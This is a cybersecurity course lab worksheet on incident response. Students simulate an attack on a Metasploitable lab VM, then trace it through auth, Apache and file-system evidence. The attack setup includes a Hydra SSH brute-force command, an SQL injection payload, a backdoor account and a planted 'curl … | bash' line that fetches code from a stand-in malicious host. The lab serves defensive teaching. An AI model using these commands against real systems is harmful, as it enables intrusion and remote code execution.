# Practical 10: Incident Response & Forensics

**Atiam College - Cyber Security & Ethical Hacking**
**Module:** Week 12 - Incident Response and Countermeasures
**Duration:** 3–4 Hours
**Difficulty:** Intermediate–Advanced

---

## Objective

By the end of this practical, you will be able to:

- Act as a defender responding to a security incident (blue team role)
- Analyze Linux system logs (`auth.log`, `syslog`, Apache logs) to track attacker actions
- Identify indicator of compromise (IoCs) including rogue accounts and persistence scripts
- Create a chronological security incident timeline
- Gather forensic evidence using command-line tools
- Understand how security monitoring tools (SIEM/IDS) detect attacks

---

## Prerequisites

- Completed Practicals 7, 8, and 9 (understanding how the attacks are carried out makes you a better defender)
- Kali Linux + Metasploitable 2 running on Host-Only network

---

## Tools Used

| Tool | What It Does |
|------|-------------|
| Log Files | `/var/log/*` - stores history of system and application actions |
| `grep` / `zgrep` | Searches through text/zipped logs for patterns |
| `awk` | Text processing tool used to extract specific log columns |
| `last` / `lastb` | Lists successful and failed system login history |
| `find` | Locates modified files and checks file integrity |

---

## Real-World Context

Cyber security is not just about hacking; it is also about defense. When a company is breached, the **Incident Response (IR)** team is called in. Their job is to find out:
- **How** did the attacker get in? (Initial access vector)
- **What** did they do while inside? (Lateral movement, execution)
- **When** did it happen? (Timeline creation)
- **Are** they still inside? (Persistence identification)

In this lab, you will step into the shoes of an Incident Responder investigating a compromised Metasploitable system.

---

## Part 1: Simulating the Attack (Setting up the crime scene)

Before we can investigate, we need to generate some attack logs on Metasploitable.

### Step 1.1 - Run a Brute Force Attack

From your **Kali VM**, run a quick Hydra attack to simulate a brute force attempt against Metasploitable's SSH service:

```bash
# Replace with your target IP
export TARGET=192.168.56.101

# Run Hydra with a small user/password list against SSH
hydra -l root -P /usr/share/wordlists/metasploit/common_passwords.txt ssh://$TARGET -t 4 -V
```

Let it run for 10-15 seconds, then stop it with `Ctrl+C`. This generates dozens of failed login logs.

### Step 1.2 - Simulate a Successful Web Attack

Open your browser in Kali and visit DVWA on Metasploitable (`http://<target-ip>/dvwa/`).
Navigate to the **SQL Injection** page.
Type a malicious input like:
```
1' UNION SELECT user, password FROM users -- -
```
Click submit. This generates web server logs containing SQL injection indicators.

### Step 1.3 - Connect and Create a Backdoor

Exploit Metasploitable via vsftpd (from Practical 7) to gain root access. Once inside:

```bash
# Create a hidden user
useradd -m -s /bin/bash backupadmin
echo "backupadmin:P@ssw0rd123" | chpasswd

# Drop a suspicious file in the tmp directory
echo "curl -s http://malicious-site.com/malware | bash" > /tmp/update.sh
chmod +x /tmp/update.sh

# Exit the shell
exit
```

Now, we have a compromised machine. Let's start the investigation!

---

## Part 2: SSH Login Analysis (Who tried to log in?)

Log into your **Metasploitable** target machine using the standard credentials (`msfadmin` / `msfadmin`). We will run our analysis commands directly on the compromised system.

### Step 2.1 - Check Successful Logins

```bash
last -n 10
```

This reads the `/var/log/wtmp` binary file and prints the last 10 successful logins.
- Look for any unexpected users logging in.
- Look at the IP address column. Does it show external/unexpected IPs?

### Step 2.2 - Check Failed Logins

```bash
lastb -n 20
```

This reads `/var/log/btmp` and lists failed login attempts.
- If you see hundreds of attempts for users like `root`, `admin`, `guest` from the same IP, this is a clear sign of an SSH brute force attack.

### Step 2.3 - Digging into the Authentication Log

The raw log file for authentication events is `/var/log/auth.log` (on Ubuntu/Debian) or `/var/log/secure` (on RedHat/CentOS).

Let's find all failed login attempts using `grep`:

```bash
sudo grep "Failed password" /var/log/auth.log | head -20
```

You should see logs matching the Hydra attack you performed in Step 1.1.

### Step 2.4 - Identify the Attacker's IP

Let's extract the IP addresses of everyone who tried (and failed) to log in, and count how many times they tried. We will use `awk` and `uniq`:

```bash
sudo grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr
```

**What this does:**
1. `grep` filters for failed password attempts.
2. `awk` extracts the IP address column (usually the 4th field from the end).
3. `sort | uniq -c` groups and counts the occurrences of each IP.
4. `sort -nr` prints the list in descending order (highest count first).

This tells you exactly which IP was performing the brute force!

---

## Part 3: Web Server Log Analysis (How did they attack the web app?)

Web server logs are a goldmine for investigations. Apache logs are located in `/var/log/apache2/`.

### Step 3.1 - Inspecting the Access Log

The access log records every HTTP request sent to the server.

```bash
sudo tail -n 50 /var/log/apache2/access.log
```

Look at the structure of a log line:
```
192.168.56.100 - - [08/Jun/2026:14:20:15 +0300] "GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT... HTTP/1.1" 200 4820
```

- **IP:** `192.168.56.100` (Attacker's IP)
- **Timestamp:** `[08/Jun/2026:14:20:15 +0300]`
- **Request:** `GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT...`
- **Response Code:** `200` (Success)

### Step 3.2 - Searching for Web Attacks (SQLi & XSS)

Let's search for typical characters used in SQL injection (like quotes `'`, `UNION`, `SELECT`):

```bash
sudo grep -i "union\|select\|concat" /var/log/apache2/access.log
```

(Note: Characters are URL-encoded in logs, e.g., `%27` for `'`, `%20` for space. The `-i` flag makes search case-insensitive.)

Now, search for XSS scripts:

```bash
sudo grep -i "script\|alert\|%3cscript%3e" /var/log/apache2/access.log
```

> **Why this matters:** When a client complains their website database was dumped, searching for database keywords (`union`, `select`, `schema`) in access logs will quickly point you to the vulnerable URL and the exact time the breach occurred.

---

## Part 4: File and System Integrity Checks (What did they leave behind?)

Once attackers gain root, they modify files or leave scripts to maintain access.

### Step 4.1 - Find Files Modified Recently

Let's search for files in the `/tmp` or `/var/www` directories that were modified in the last 60 minutes:

```bash
find /tmp -mmin -60 -type f 2>/dev/null
find /var/www -mmin -60 -type f 2>/dev/null
```

You should see `/tmp/update.sh` which we created in Part 1.

### Step 4.2 - Checking Active Shell Connections

Is the attacker currently connected? Let's check network connections:

```bash
sudo netstat -nap | grep ESTABLISHED
# or using ss
sudo ss -ap | grep ESTAB
```

Look for connections on unexpected ports like `6200` (vsftpd backdoor port) or `4444` (default Metasploit payload port).

### Step 4.3 - Identify Rogue Accounts

Check the user list for users with high privileges:

```bash
# Look for users with UID 0 (root level)
awk -F: '($3 == 0) {print $1}' /etc/passwd
```

Expected output should show `root` and possibly others. If you see a user you did not create, it's a critical finding.

Check recent user additions in the `/etc/passwd` file:

```bash
tail -n 5 /etc/passwd
```

You should see the `backupadmin` user we created earlier.

---

## Part 5: Building the Incident Timeline

A critical skill in Incident Response is building a clear, chronologically ordered timeline of the attack.

### Step 5.1 - Create your IR Log

Create a file on your Kali VM to document your findings:

```bash
cat > ~/cyber-labs/incident-timeline.md << 'EOF'
# Security Incident Report & Timeline

## Incident Overview
- **System Compromised:** Metasploitable 2
- **Investigation Date:** [Today's Date]
- **Lead Investigator:** [Your Name]
- **Status:** Contained / Under Investigation

## Chronological Timeline of Events

| Time (HH:MM:SS) | Source IP | Event / Action | Impact / Evidence |
|-----------------|-----------|----------------|-------------------|
| 14:10:00 (approx)| 192.168.56.100 | SSH Brute force attack started | Detected hundreds of "Failed password" in auth.log |
| 14:20:15    | 192.168.56.100 | Web application SQL Injection | Spotted `%27+UNION+SELECT` in Apache logs |
| 14:25:00    | 192.168.56.100 | Exploitation of vsftpd service | Logged connection from attacker port |
| 14:26:30    | 192.168.56.100 | Backdoor creation & privilege escalation | New user `backupadmin` created, `/tmp/update.sh` placed |

## Indicators of Compromise (IoCs)
- **Attacker IP Address:** 
- **Malicious Files:** 
- **Unauthorized Accounts:** 
- **Suspicious Ports Active:** 

## Remediation Plan
1. [Action 1: e.g., Terminate connection on port X]
2. [Action 2: e.g., Delete rogue user account]
3. [Action 3: e.g., Patch vsftpd service]
4. [Action 4: e.g., Secure web application SQL query]
EOF

nano ~/cyber-labs/incident-timeline.md
```

### Step 5.2 - Fill In the Report

Complete the timeline and IoC fields using the details you gathered during your logs investigation.

---

## Challenge Section (Optional)

1. **Investigate the `syslog`** - Run `sudo grep -i cron /var/log/syslog` to check if the attacker set up any persistence scripts using cron jobs.
2. **Inspect Process Trees** - Run `ps auxf` and look at the hierarchy of processes. Can you spot a shell running under a daemon like `vsftpd`?
3. **Analyze auth.log size** - Attackers often clear history or truncate logs. Research how a defender can detect if a log file was wiped using file metadata (`ls -lc /var/log/auth.log`).

---

## Summary & Outcomes

| Skill | Status |
|-------|--------|
| Analyze authentication logs for brute force attacks | Yes |
| Track web attacks (SQLi, XSS) via access logs | Yes |
| Scan directories for recently modified files | Yes |
| Identify unauthorized user additions and connections | Yes |
| Structure a chronological incident timeline | Yes |

---

## Reflection Questions

1. If an attacker wipes the `/var/log/auth.log` file, how can a security administrator still find out what happened?
2. What is the difference between an Indicator of Compromise (IoC) and an Indicator of Attack (IoA)?
3. Why are system logs typically forwarded to a secondary, dedicated log server (SIEM) in corporate environments?
4. When performing incident response, why is it critical to preserve the compromised server's state instead of immediately rebooting it?
5. How would you distinguish between a normal user typing a wrong password and an automated brute-force attack when analyzing logs?
